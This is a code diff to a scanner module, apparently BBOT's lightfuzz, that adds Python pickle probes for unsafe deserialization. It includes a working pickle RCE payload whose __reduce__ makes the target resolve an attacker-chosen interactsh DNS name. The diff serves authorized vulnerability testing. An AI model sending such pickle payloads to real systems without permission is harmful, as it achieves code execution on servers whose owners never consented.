@@ -1,5 +1,22 @@
+import base64
+import pickle
+import socket
+
 from .base import BaseLightfuzz
 from bbot.errors import HttpCompareError
+
+
+class _PickleOOB:
+    """Pickle-RCE canary: __reduce__ makes the deserializing process resolve
+    a controlled DNS name, which can be observed via interactsh. Declared
+    at module scope so the ``socket.gethostbyname`` reference pickles
+    cleanly by fully-qualified name."""
+
+    def __init__(self, callback_host):
+        self._callback_host = callback_host
+
+    def __reduce__(self):
+        return (socket.gethostbyname, (self._callback_host,))
 
 
 class serial(BaseLightfuzz):
@@ -15,6 +32,13 @@ class serial(BaseLightfuzz):
     """
 
     friendly_name = "Unsafe Deserialization"
+    uses_interactsh = True
+    # Serial probes are raw serialized bytes (base64/hex/PHP-raw) — the exact
+    # wire format the target receives. Bypass the envelope system so probes
+    # aren't re-encoded based on what the parameter's original value looked
+    # like (e.g. preventing an already-base64 pickle from being base64'd again
+    # because the original value happened to be base64-wrapped plain text).
+    skip_envelopes = True
 
     # Class-level constants
     CONTROL_PAYLOAD_HEX = "f56124208220432ec767646acd2e6c6bc9622a62c5656f2eeb616e2f"
@@ -28,12 +52,16 @@ class serial(BaseLightfuzz):
         "java_base64_OptionalDataException": "rO0ABXcEAAAAAAEAAAABc3IAEGphdmEudXRpbC5IYXNoTWFwAAAAAAAAAAECAAJMAARrZXkxYgABAAAAAAAAAAJ4cHcBAAAAB3QABHRlc3Q=",
         "dotnet_base64": "AAEAAAD/////AQAAAAAAAAAGAQAAAAdndXN0YXZvCw==",
         "ruby_base64": "BAh7BjoKbE1FAAVJsg==",
+        # Python pickle v4 of the string "test" — benign value, but any
+        # endpoint that accepts it without error is pickle-deserializing.
+        "python_pickle_base64": "gASVCAAAAAAAAACMBHRlc3SULg==",
     }
 
     HEX_SERIALIZATION_PAYLOADS = {
         "java_hex": "ACED00057372000E6A6176612E6C616E672E426F6F6C65616ECD207EC0D59CF6EE02000157000576616C7565787000",
         "java_hex_OptionalDataException": "ACED0005737200106A6176612E7574696C2E486173684D617000000000000000012000014C00046B6579317A00010000000000000278707000000774000474657374",
         "dotnet_hex": "0001000000ffffffff01000000000000000601000000076775737461766f0b",
+        "python_pickle_hex": "80049508000000000000008C0474657374942E",
     }
 
     PHP_RAW_SERIALIZATION_PAYLOADS = {
@@ -45,6 +73,7 @@ class serial(BaseLightfuzz):
         "cannot cast java.lang.string",
         "dump format error",
         "java.io.optionaldataexception",
+        "unpicklingerror",  # Python pickle, distinctive to the pickle module
     ]
 
     GENERAL_ERROR_STRINGS = [
@@ -246,3 +275,35 @@ class serial(BaseLightfuzz):
         for r in self.results:
             r.pop("_technique", None)
             r.pop("_language", None)
+
+        # Blind RCE via Python pickle OOB. Payload generation is native to
+        # Python (unlike ysoserial-style Java/.NET gadgets that require
+        # out-of-process tooling), so we build the payload fresh with a
+        # unique interactsh subdomain each scan. A hit confirms not just
+        # "deserialization happens" but "attacker-controlled code ran".
+        if self.lightfuzz.interactsh_instance:
+            self.lightfuzz.event_dict[self.event.url] = self.event
+            subdomain_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
+            callback_host = f"{subdomain_tag}.{self.lightfuzz.interactsh_domain}"
+            self.lightfuzz.interactsh_subdomain_tags[subdomain_tag] = {
+                "event": self.event,
+                "name": "Unsafe Deserialization",
+                "description": (
+                    f"Python pickle OOB RCE (OOB Interaction) Type: [{self.event.data['type']}] "
+                    f"Parameter Name: [{self.event.data['name']}] Payload: [python_pickle_oob]"
+                ),
+                "severity": "CRITICAL",
+                "confidence": "CONFIRMED",
+            }
+            try:
+                pickle_oob_bytes = pickle.dumps(_PickleOOB(callback_host))
+                pickle_oob_b64 = base64.b64encode(pickle_oob_bytes).decode()
+            except Exception as e:
+                self.debug(f"failed to build pickle OOB payload: {e}")
+            else:
+                await self.standard_probe(
+                    self.event.data["type"],
+                    cookies,
+                    pickle_oob_b64,
+                    timeout=15,
+                )
